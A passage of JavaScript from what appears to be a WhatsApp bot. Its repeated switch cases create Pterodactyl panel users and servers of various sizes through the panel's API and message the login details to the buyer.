let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7168"
let cpu = "170"
let disk = "7168"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8192"
let cpu = "200"
let disk = "8192"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9216"
let cpu = "220"
let disk = "9216"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "15gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "15GB"
let egg = global.eggsnya
let loc = global.location
let memo = "15240"
let cpu = "420"
let disk = "15240"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "14gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "14GB"
let egg = global.eggsnya
let loc = global.location
let memo = "14240"
let cpu = "360"
let disk = "14240"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "13gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "13GB"
let egg = global.eggsnya
let loc = global.location
let memo = "13240"
let cpu = "230"
let disk = "13240"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "12gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "12GB"
let egg = global.eggsnya
let loc = global.location
let memo = "12240"
let cpu = "310"
let disk = "12240"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
